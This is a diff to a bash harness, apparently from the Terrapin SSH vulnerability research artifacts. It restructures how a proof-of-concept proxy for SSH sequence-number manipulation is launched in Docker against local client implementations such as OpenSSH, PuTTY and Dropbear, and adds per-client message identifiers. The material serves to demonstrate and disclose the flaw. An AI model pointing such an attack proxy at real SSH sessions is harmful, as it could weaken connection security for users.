@@ -41,7 +41,7 @@ function start_ssh_server {
     $SERVER_IMAGE -p $SERVER_PORT > /dev/null 2>&1
 }
 
-function select_and_run_poc_proxy {
+function select_poc_proxy {
   echo "[i] This script supports the following sequence number manipulations as PoC:"
   echo -e "\t1) RcvIncrease"
   echo -e "\t2) RcvDecrease"
@@ -69,16 +69,25 @@ function select_and_run_poc_proxy {
   echo "[+] Selected PoC variant: '$POC_VARIANT_NAME'"
 
   read -p "[+] Please choose a natural number N between 0 and 2^32 to increase or decrease the sequence number by: " DECREASE_INCREASE_BY
-
-  docker run \
-    --rm \
-    --network host \
-    --name $POC_CONTAINER_NAME \
-    $POC_IMAGE --proxy-port $POC_PORT --server-ip "127.0.0.1" --server-port $SERVER_PORT -N $DECREASE_INCREASE_BY &
-  sleep 5
 }
 
-function select_and_run_client {
+function run_poc_proxy {
+  if [[ $POC_VARIANT -eq 1 ]] || [[ $POC_VARIANT -eq 2 ]]; then
+    docker run \
+      --rm \
+      --network host \
+      --name $POC_CONTAINER_NAME \
+      $POC_IMAGE --proxy-port $POC_PORT --server-ip "127.0.0.1" --server-port $SERVER_PORT -N $DECREASE_INCREASE_BY &
+  else
+    docker run \
+      --rm \
+      --network host \
+      --name $POC_CONTAINER_NAME \
+      $POC_IMAGE --proxy-port $POC_PORT --server-ip "127.0.0.1" --server-port $SERVER_PORT -N $DECREASE_INCREASE_BY --unknown-id $UNKNOWN_ID &  
+  fi
+}
+
+function select_client {
   echo "[i] This script supports the following SSH client implementations:"
   echo -e "\t1) AsyncSSH 2.13.2"
   echo -e "\t2) Dropbear 2022.83"
@@ -92,33 +101,41 @@ function select_and_run_client {
     1)
       CLIENT_IMPL_NAME="AsyncSSH 2.13.2"
       CLIENT_IMAGE="terrapin-artifacts/asyncssh-client:2.13.2"
-      ARGS="--host 127.0.0.1 --port $POC_PORT --username victim" ;;
+      ARGS="--host 127.0.0.1 --port $POC_PORT --username victim"
+      UNKNOWN_ID="09" ;;
     2)
       CLIENT_IMPL_NAME="Dropbear 2022.83"
       CLIENT_IMAGE="terrapin-artifacts/dropbear-client:2022.83"
-      ARGS="-p $POC_PORT victim@127.0.0.1" ;;
+      ARGS="-p $POC_PORT victim@127.0.0.1"
+      UNKNOWN_ID="C0" ;;
     3)
       CLIENT_IMPL_NAME="libssh 0.10.5"
       CLIENT_IMAGE="terrapin-artifacts/libssh-client:0.10.5" 
-      ARGS="-p $POC_PORT victim@127.0.0.1" ;;
+      ARGS="-p $POC_PORT victim@127.0.0.1"
+      UNKNOWN_ID="C0" ;;
     4)
       CLIENT_IMPL_NAME="OpenSSH 9.4p1"
       CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.4p1"
-      ARGS="-p $POC_PORT victim@127.0.0.1" ;;
+      ARGS="-p $POC_PORT victim@127.0.0.1"
+      UNKNOWN_ID="09" ;;
     5)
       CLIENT_IMPL_NAME="OpenSSH 9.5p1"
       CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.5p1"
-      ARGS="-p $POC_PORT victim@127.0.0.1" ;;
+      ARGS="-p $POC_PORT victim@127.0.0.1"
+      UNKNOWN_ID="09" ;;
     6)
       CLIENT_IMPL_NAME="PuTTY 0.79"
       CLIENT_IMAGE="terrapin-artifacts/putty-client:0.79"
-      ARGS="-P $POC_PORT victim@127.0.0.1" ;;
+      ARGS="-P $POC_PORT victim@127.0.0.1"
+      UNKNOWN_ID="C0" ;;
     *)
       echo "[!] Invalid selection, please re-run the script"
       exit 1 ;;
   esac
   echo "[+] Selected client implementation: '$CLIENT_IMPL_NAME'"
+}
 
+function run_client {
   docker run \
     --rm \
     --network host \
@@ -138,7 +155,9 @@ function cleanup {
 ensure_images
 print_info
 start_ssh_server
-select_and_run_poc_proxy
+select_poc_proxy
+select_client
+run_poc_proxy
 sleep 5
-select_and_run_client
+run_client
 cleanup
